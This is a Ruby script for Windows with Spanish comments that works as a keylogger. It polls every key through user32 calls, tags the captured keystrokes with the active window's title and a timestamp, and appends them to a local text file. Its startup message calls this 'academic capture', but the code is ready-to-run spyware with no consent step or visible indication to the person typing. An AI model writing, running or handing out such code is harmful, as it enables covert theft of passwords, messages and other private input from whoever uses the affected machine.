require 'fiddle'
require 'fiddle/import'

module Win32
  extend Fiddle::Importer
  dlload 'user32'
  
  # Importamos funciones para el teclado y las ventanas
  extern 'short GetAsyncKeyState(int)'
  extern 'long GetForegroundWindow()'
  extern 'int GetWindowTextW(long, char*, int)' # Versión Unicode (W)
end

ARCHIVO_LOG = "registro_teclas.txt"
$ultima_ventana = ""

def obtener_titulo_ventana
  handle = Win32.GetForegroundWindow()
  # Creamos un buffer de 512 bytes para el texto (UTF-16)
  buffer = "\0" * 512
  Win32.GetWindowTextW(handle, buffer, 256)
  # Convertimos de UTF-16LE a UTF-8 y quitamos caracteres nulos
  buffer.force_encoding('UTF-16LE').encode('UTF-8').strip.gsub("\0", "")
end

def registrar(mensaje)
  ventana_actual = obtener_titulo_ventana
  
  File.open(ARCHIVO_LOG, "a", encoding: "utf-8") do |f|
    timestamp = Time.now.strftime("%Y-%m-%d %H:%M:%S")
    
    # Solo escribimos el nombre de la ventana si cambió
    if ventana_actual != $ultima_ventana
      f.write("\n" + "="*50 + "\n")
      f.write("[VENTANA: #{ventana_actual}]\n")
      f.write("="*50 + "\n")
      $ultima_ventana = ventana_actual
    end
    
    f.write("[#{timestamp}] #{mensaje}\n")
  end
end

puts "Iniciando captura académica con detección de contexto..."

loop do
  (8..255).each do |vkey|
    if (Win32.GetAsyncKeyState(vkey) & 0x8000) != 0
      case vkey
      when 8  then registrar(" [BORRAR] ")
      when 13 then registrar(" [ENTER] ")
      when 32 then registrar(" [ESPACIO] ")
      when 160, 161 then next # Shift
      else
        # Intentar capturar caracteres legibles
        caracter = vkey.chr rescue nil
        if caracter && caracter.bytesize == 1 && caracter.ord < 128
          registrar("Tecla: #{caracter}")
        end
      end
      sleep 0.12 # Evitar rebote de teclas
    end
  end
  sleep 0.01 
end